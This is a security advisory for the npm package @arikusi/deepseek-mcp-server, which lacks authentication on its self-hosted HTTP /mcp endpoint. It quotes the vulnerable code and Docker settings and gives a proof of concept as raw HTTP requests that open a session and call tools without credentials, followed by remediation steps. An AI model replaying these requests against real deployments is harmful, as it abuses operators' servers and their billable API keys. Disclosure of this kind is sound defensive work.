# [M] @arikusi/deepseek-mcp-server: Missing Authentication on Self-Hosted HTTP MCP Endpoint

## Summary
Severity: Medium
Advisory: GHSA-72f3-6w86-7rv3
CVE: CVE-2026-55605
CWE: CWE-306
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-72f3-6w86-7rv3
Type: github-advisory

## Affected
- npm: `@arikusi/deepseek-mcp-server` — affected >=1.4.2 <1.8.0

## Details
## Summary
The self-hosted HTTP transport of `@arikusi/deepseek-mcp-server` exposes `POST /mcp` without any authentication: `createMcpExpressApp` is called without an `authProvider` and no middleware guards the route, so any network-reachable client can issue an unauthenticated `initialize` request and obtain a valid MCP session identifier. In reproduced testing against commit `5e1302171e99`, an unauthenticated client was able to initialize a session, enumerate tools, and invoke the local `deepseek_sessions` tool with no credentials. The same unauthenticated session also exposes `deepseek_chat`, whose handler uses the server-side `DEEPSEEK_API_KEY` when self-hosted deployments configure one.

This issue applies to self-hosted HTTP mode, not the separately documented hosted BYOK endpoint in `README.md`, which expects an `Authorization: Bearer ...` header. Upstream self-hosted container assets enable HTTP mode by default (`Dockerfile`) and publish port `3000` (`docker-compose.yml`).

## Affected Code
`src/transport-http.ts:17` — `createMcpExpressApp` called without `authProvider`; no challenge is issued to incoming requests

```typescript
export function createHttpApp(serverFactory: () => McpServer) {
  const app = createMcpExpressApp({ host: '0.0.0.0' });
```

`src/transport-http.ts:31` — `POST /mcp` handler instantiates a full MCP session for any body that satisfies `isInitializeRequest`, with no preceding auth check

```typescript
  app.post('/mcp', async (req, res) => {
    const sessionId = req.headers['mcp-session-id'] as string | undefined;

    if (sessionId && transports[sessionId]) {
      await transports[sessionId].handleRequest(req, res, req.body);
      return;
    }

    if (!sessionId && isInitializeRequest(req.body)) {
      const transport = new StreamableHTTPServerTransport({
        sessionIdGenerator: () => randomUUID(),
        onsessioninitialized: (id) => {
          transports[id] = transport;
          console.error(`[DeepSeek MCP] HTTP session initialized: ${id}`);
        },
      });

      const server = serverFactory();
      await server.connect(transport);
      await transport.handleRequest(req, res, req.body);
```

HTTP client → `POST /mcp` (no auth middleware) → `transport-http.ts:41` (`isInitializeRequest` branch) → `transport-http.ts:57–59` (`serverFactory()+connect+handleRequest`)

`Dockerfile:12-13` — upstream container image defaults to self-hosted HTTP mode

```dockerfile
ENV TRANSPORT=http
ENV HTTP_PORT=3000
```

`docker-compose.yml:4-8` — upstream compose file publishes port `3000` and enables HTTP mode

```yaml
services:
  deepseek-mcp:
    ports:
      - "3000:3000"
    environment:
      - TRANSPORT=http
```

## Proof of Concept
Step 1 — send unauthenticated `initialize`: server returns HTTP 200 and a live `mcp-session-id` — proves no credentials are required to establish a session.

```bash
python3 poc.py
```

```http
POST /mcp HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
Accept: application/json, text/event-stream

{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"poc-client","version":"1.0"}}}
```

```http
HTTP/1.1 200 OK
content-type: text/event-stream
mcp-session-id: b029fc8f-02cc-4a8c-a0e2-0223cf35b1ba

event: message
data: {"result":{"protocolVersion":"2024-11-05","capabilities":{"tools":{"listChanged":true},"prompts":{"listChanged":true},"resources":{"listChanged":true}},"serverInfo":{"name":"deepseek-mcp-server","version":"1.7.0"}},"jsonrpc":"2.0","id":1}
```

Step 2 — send unauthenticated `tools/list` on the obtained session: server returns the full tool surface (`deepseek_chat`, `deepseek_sessions`) — proves tool discovery is reachable without credentials.

```http
POST /mcp HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
Accept: application/json, text/event-stream
mcp-session-id: b029fc8f-02cc-4a8c-a0e2-0223cf35b1ba

{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}
```

```text
RESULT: PASS — tools/list returned deepseek_chat and deepseek_sessions with no credentials supplied.
```

Step 3 — send unauthenticated `tools/call` for the local `deepseek_sessions` tool on the obtained session: server executes the tool and returns its result with no credentials supplied.

```http
POST /mcp HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
Accept: application/json, text/event-stream
mcp-session-id: 6cf58ad1-40cc-4cd4-99a3-f5f198b8bf71

{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"deepseek_sessions","arguments":{"action":"list"}}}
```

```http
HTTP/1.1 200 OK
content-type: text/event-stream

event: message
data: {"result":{"content":[{"type":"text","text":"No active sessions."}]},"jsonrpc":"2.0","id":2}
```

## Impact
In self-hosted HTTP deployments, any host with network access to port `3000` can establish an authenticated-equivalent MCP session and invoke built-in MCP tools without supplying credentials. This was verified end-to-end for session establishment, tool enumeration, and execution of the local `deepseek_sessions` tool.

`deepseek_chat` is exposed through the same unauthenticated MCP session, and its handler routes requests through the server-side DeepSeek client. That means a deployment using a valid server-side `DEEPSEEK_API_KEY` places billable DeepSeek operations behind an unauthenticated endpoint. However, this report's reproduced PoC used a dummy API key and did not directly validate successful upstream DeepSeek billing or quota consumption.

## Remediation
Require authentication in self-hosted HTTP mode before MCP session creation. At minimum, pass an `authProvider` to `createMcpExpressApp` at `transport-http.ts:17` or place equivalent authentication middleware / a reverse proxy in front of `/mcp` so unauthenticated clients never reach the initialize branch:

```typescript
const app = createMcpExpressApp({
  host: '0.0.0.0',
  authProvider,
});
```

For deployments that only need local access, bind to `127.0.0.1` instead of `0.0.0.0` in both `createMcpExpressApp` and `app.listen` (`transport-http.ts:17` and `:107`) as a defence-in-depth measure. Upstream `docker-compose.yml` currently publishes `3000:3000`; changing that to `127.0.0.1:3000:3000` would reduce inadvertent exposure on multi-user or server hosts.

## References
- https://github.com/arikusi/deepseek-mcp-server/security/advisories/GHSA-72f3-6w86-7rv3
- https://nvd.nist.gov/vuln/detail/CVE-2026-55605
- https://github.com/arikusi/deepseek-mcp-server/pull/4
- https://github.com/arikusi/deepseek-mcp-server/commit/dab07ed93ddde0ab219d4cb7066785847db53a32
- https://github.com/arikusi/deepseek-mcp-server
- https://github.com/arikusi/deepseek-mcp-server/blob/main/CHANGELOG.md#180---2026-06-14
- https://github.com/arikusi/deepseek-mcp-server/releases/tag/v1.8.0
